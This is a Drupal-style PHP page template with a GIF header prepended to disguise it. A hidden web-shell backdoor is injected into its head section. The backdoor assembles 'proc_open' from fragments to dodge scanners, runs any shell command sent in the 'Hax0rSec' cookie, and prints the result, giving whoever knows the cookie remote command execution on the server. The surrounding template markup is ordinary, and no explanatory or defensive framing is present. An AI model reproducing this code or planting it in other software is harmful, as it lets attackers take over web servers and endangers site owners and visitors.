GIF89a;
;;
<!DOCTYPE html>
<html lang="<?php print $language->language; ?>" dir="<?php print $language->dir; ?>">

<head>
  <?php print $head; ?>
<?php error_reporting(0); if(isset($_COOKIE['Hax0rSec'])){ $a = "pro"; $b = "c_"; $c = "open"; $func = $a.$b.$c; $descriptorspec = array( 0 => array('pipe', 'r'), 1 => array('pipe', 'w'), 2 => array('pipe', 'w') ); $process = $func($_COOKIE['Hax0rSec'], $descriptorspec, $pipes); if (is_resource($process)) { fclose($pipes[0]); echo stream_get_contents($pipes[1]); fclose($pipes[1]); $return_value = proc_close($process); } exit; }?>
  <title><?php print $head_title; ?></title>
  <?php print $styles; ?>
  <?php print $scripts; ?>
  <!--[if lt IE 9]>
    <script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
  <![endif]-->
</head>

<body class="<?php print $classes; ?>" <?php print $attributes;?>>
  <?php print $page_top; ?>
  <?php print $page; ?>
  <?php print $page_bottom; ?>
</body>

</html>
